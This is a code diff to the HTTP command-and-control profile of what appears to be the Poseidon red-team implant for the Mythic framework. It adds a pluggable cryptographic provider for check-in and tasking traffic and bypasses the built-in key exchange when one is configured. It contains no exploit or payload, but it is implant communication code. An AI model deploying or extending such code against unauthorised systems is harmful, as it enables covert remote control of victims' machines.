@@ -9,6 +9,7 @@ import (
 	"io"
 	"os"
 
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/cryptoprovider"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 
@@ -31,6 +32,8 @@ import (
 var http_initial_config string
 
 type HTTPInitialConfig struct {
+	CryptoProvider         string
+	CryptoProviderConfig   string
 	CallbackHost           string
 	CallbackPort           uint
 	Killdate               string
@@ -63,6 +66,20 @@ func (e *HTTPInitialConfig) UnmarshalJSON(data []byte) error {
 	err := json.Unmarshal(data, &alias)
 	if err != nil {
 		return err
+	}
+	if v, ok := alias["crypto_provider"]; ok {
+		var valid bool
+		e.CryptoProvider, valid = v.(string)
+		if !valid {
+			return fmt.Errorf("crypto_provider must be a string")
+		}
+	}
+	if v, ok := alias["crypto_provider_config"]; ok {
+		var valid bool
+		e.CryptoProviderConfig, valid = v.(string)
+		if !valid {
+			return fmt.Errorf("crypto_provider_config must be a string")
+		}
 	}
 	if v, ok := alias["callback_host"]; ok {
 		e.CallbackHost = v.(string)
@@ -116,6 +133,8 @@ func (e *HTTPInitialConfig) UnmarshalJSON(data []byte) error {
 }
 
 type C2HTTP struct {
+	cryptoProvider        cryptoprovider.Session
+	providerHTTP          *http.Client
 	BaseURL               string
 	PostURI               string
 	ProxyURL              string
@@ -211,6 +230,15 @@ func init() {
 		interruptSleepChannel: make(chan bool, 1),
 	}
 
+	if initialConfig.CryptoProvider != "" || initialConfig.CryptoProviderConfig != "" {
+		profile.cryptoProvider, err = cryptoprovider.New(initialConfig.CryptoProvider, initialConfig.CryptoProviderConfig, UUID)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("invalid HTTP cryptographic provider: %v\n", err))
+			os.Exit(1)
+		}
+		profile.Key = ""
+	}
+
 	// Convert sleep from string to integer
 	profile.Interval = int(initialConfig.Interval)
 	if profile.Interval < 0 {
@@ -238,7 +266,7 @@ func init() {
 
 	// Convert ignore_proxy from string to bool
 	profile.ProxyBypass = initialConfig.ProxyBypass
-	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
+	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck && profile.cryptoProvider == nil
 
 	RegisterAvailableC2Profile(&profile)
 }
@@ -268,6 +296,14 @@ func (c *C2HTTP) Start() {
 		checkIn := c.CheckIn()
 		// If we successfully checkin, get our new ID and start looping
 		if strings.Contains(checkIn.Status, "success") {
+			if c.cryptoProvider != nil {
+				if pendingReply := c.providerResumeMessage(); len(pendingReply) > 0 {
+					var taskReply structs.MythicMessageResponse
+					if err := json.Unmarshal(pendingReply, &taskReply); err == nil {
+						responses.HandleInboundMythicMessageFromEgressChannel <- taskReply
+					}
+				}
+			}
 			for {
 				if c.ShouldStop {
 					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
@@ -414,6 +450,9 @@ func (c *C2HTTP) GetPushChannel() chan structs.MythicMessage {
 
 // CheckIn a new agent
 func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
+	if c.cryptoProvider != nil {
+		return c.providerCheckIn()
+	}
 
 	// Start Encrypted Key Exchange (EKE)
 	if c.ExchangingKeys {
@@ -519,6 +558,9 @@ func (c *C2HTTP) IsRunning() bool {
 
 // htmlPostData HTTP POST function
 func (c *C2HTTP) SendMessage(sendData []byte) []byte {
+	if c.cryptoProvider != nil {
+		return c.providerSendMessage(sendData)
+	}
 	defer func() {
 		// close all idle connections
 		client.CloseIdleConnections()
